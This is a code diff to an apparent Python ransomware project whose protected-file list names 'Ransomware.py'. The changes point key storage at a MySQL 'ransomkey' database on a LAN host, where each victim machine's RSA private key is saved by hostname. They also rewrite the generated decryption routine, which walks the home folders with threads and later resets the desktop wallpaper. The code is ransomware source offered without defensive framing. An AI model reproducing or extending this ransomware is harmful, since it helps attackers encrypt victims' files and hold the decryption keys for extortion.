@@ -38,7 +38,7 @@ def protect_Code_Files(filename):
     if filename in ("__init__.py", "asn1.py", "cli.py", "common.py",
                     "core.py", "key.py", "parallel.py", "pem.py",
                     "pkcs1.py", "pkcs1_v2.py", "prime.py", "randnum.py",
-                    "trasform.py", "util.py","Ransomware.py","image.png"):
+                    "transform.py", "util.py","Ransomware.py","image.png"):
         return True
     return False
 
@@ -63,7 +63,7 @@ def crypt():
     publicKey = str(pubkey.n) + "," + str(pubkey.e)
     privateKey = str(privkey.n) + "," + str(privkey.e) + "," + str(privkey.d) + "," + str(privkey.p) + "," + str(privkey.q)
     # connect to the database
-    cnx = mysql.connector.connect(user='root', password='', host='192.168.1.6', database='ransomkey')
+    cnx = mysql.connector.connect(user='root', password='', host='192.168.1.7', database='ransomkey')
     cursor = cnx.cursor()
 
     input('wait')
@@ -108,6 +108,7 @@ def crypt():
     program_code = '''
 import os
 import sys
+from threading import Thread
 
 # adding Folder_2 to the system path
 sys.path.insert(0, 'C:\\\\Users\\\\belha\\\\Desktop\\\\crypto_project')
@@ -116,7 +117,7 @@ import win32api
 from datetime import datetime
 import mysql.connector
 from __init__ import decrypt_file
-from key import PrivateKey
+from key import newkeys, PrivateKey
 
 def decyptionalgorithme(key):
     key = key.split(",")
@@ -128,16 +129,12 @@ def decyptionalgorithme(key):
     for folder in folders_in_home_directory:
         for dirpath, dirnames, filenames in os.walk(os.path.join(userhome, folder)):
             for filename in filenames:
-                if protect_Code_Files(filename) == False:
-                    file = os.path.join(dirpath, filename)
-                    if os.access(file, os.W_OK) and os.access(file, os.R_OK):
-                        try:
-                            Thread(target=decrypt_file, args=(file, finalkey)).start()
-                            print(file, " : decrypted successfully ")
-                        except:
-                            print("ignoring error on crypting this file : ", file)
-                    else:
-                        print("access denied to this file : ", file)    
+                file = os.path.join(dirpath, filename)
+                if os.access(file, os.W_OK) and os.access(file, os.R_OK):
+                    Thread(target=decrypt_file, args=(file, finalkey)).start()
+                    print(file, " : decrypted successfully ")
+                else:
+                    print("access denied to this file : ", file)    
     
     import ctypes
     SPI_SETDESKWALLPAPER = 20
@@ -149,7 +146,7 @@ def decrypt():
     hostname = []
     hostname.append(os.getenv('COMPUTERNAME'))
     cnx = mysql.connector.connect(user='root', password='',
-                            host='192.168.1.6', database='ransomkey')
+                            host='192.168.1.7', database='ransomkey')
     cursor = cnx.cursor()
     query = "SELECT private_key FROM ransomkeys where hostname=%s"
     params = (hostname)
